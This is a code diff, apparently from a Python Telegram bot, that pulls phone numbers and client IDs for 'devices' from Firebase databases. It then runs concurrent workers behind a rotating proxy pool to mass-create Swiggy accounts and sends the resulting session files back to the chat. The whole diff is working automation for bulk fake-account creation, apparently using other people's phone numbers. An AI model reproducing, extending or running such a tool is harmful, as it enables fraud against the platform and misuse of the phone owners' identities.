+            if not user_jobs.get(uid):
+                break
+            if not fb.endswith("/"):
+                fb += "/"
+            await progress(f"🔥 Scanning {fb[:60]}...")
+            devices = await load_firebase_devices(fb)
+            online = [d for d in devices if d["online"]]
+            pool = online if online else devices
+            await progress(f"Found {len(devices)} devices · online {len(online)} · using {len(pool)}")
+
+            sem = asyncio.Semaphore(MAX_WORKERS)
+
+            async def worker(entry):
+                async with sem:
+                    if not user_jobs.get(uid):
+                        return
+                    sess = await process_one(
+                        entry["phone"], entry["client_id"], fb, progress, used
+                    )
+                    if sess:
+                        user_sessions_collect[uid].append(sess)
+
+            tasks = [worker(e) for e in pool]
+            await asyncio.gather(*tasks)
+
+        sessions = user_sessions_collect.get(uid, [])
+        if sessions:
+            combined = {s["mobile"]: s for s in sessions}
+            out = DATA_DIR / f"all_sessions_{uid}_{int(time.time())}.json"
+            out.write_text(json.dumps(combined, indent=2), encoding="utf-8")
+            await context.bot.send_document(
+                chat.id,
+                document=out.open("rb"),
+                filename=out.name,
+                caption=f"✅ {len(sessions)} Swiggy accounts created",
+            )
+            for s in sessions[-10:]:
+                p = SUCCESS_DIR / f"swiggy_{s['mobile']}.json"
+                if p.exists():
+                    await context.bot.send_document(
+                        chat.id, document=p.open("rb"), filename=p.name
+                    )
+        else:
+            await progress("No accounts created this run.")
+    finally:
+        user_jobs[uid] = False
+
+async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    doc = update.message.document
+    if not doc or not doc.file_name:
+        return
+    if "proxy" in doc.file_name.lower():
+        f = await doc.get_file()
+        data = await f.download_as_bytearray()
+        PROXIES_FILE.write_bytes(data)
+        PROXY.load_file(PROXIES_FILE)
+        await update.message.reply_text(f"Loaded {len(PROXY.pool)} proxies from file.")
+
+def main():
+    PROXY.load_file(PROXIES_FILE)
+
+    application = (
+        Application.builder()
+        .token(BOT_TOKEN)
+        .concurrent_updates(True)
+        .build()
+    )
+    application.add_handler(CommandHandler("start", cmd_start))
+    application.add_handler(CommandHandler("status", cmd_status))
+    application.add_handler(CommandHandler("proxies", cmd_proxies))
+    application.add_handler(CommandHandler("jsons", cmd_get_jsons))
+    application.add_handler(CommandHandler("stop", cmd_stop))
+    application.add_handler(MessageHandler(filters.Document.ALL, on_document))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
+
+    async def health(_):
+        return web.Response(text="ok")
+
+    web_app = web.Application()
+    web_app.router.add_get("/", health)
+    web_app.router.add_get("/health", health)
+
+    async def runner():
+        await application.initialize()
+        await application.start()
+        await application.updater.start_polling(drop_pending_updates=True)
+
+        runner_ = web.AppRunner(web_app)
+        await runner_.setup()
+        site = web.TCPSite(runner_, "0.0.0.0", PORT)
+        await site.start()
+        log.info("listening on :%s", PORT)
+
+        # keep alive forever
+        while True:
+            await asyncio.sleep(3600)
+
+    asyncio.run(runner())
 
 if __name__ == "__main__":
-    interactive()
+    main()
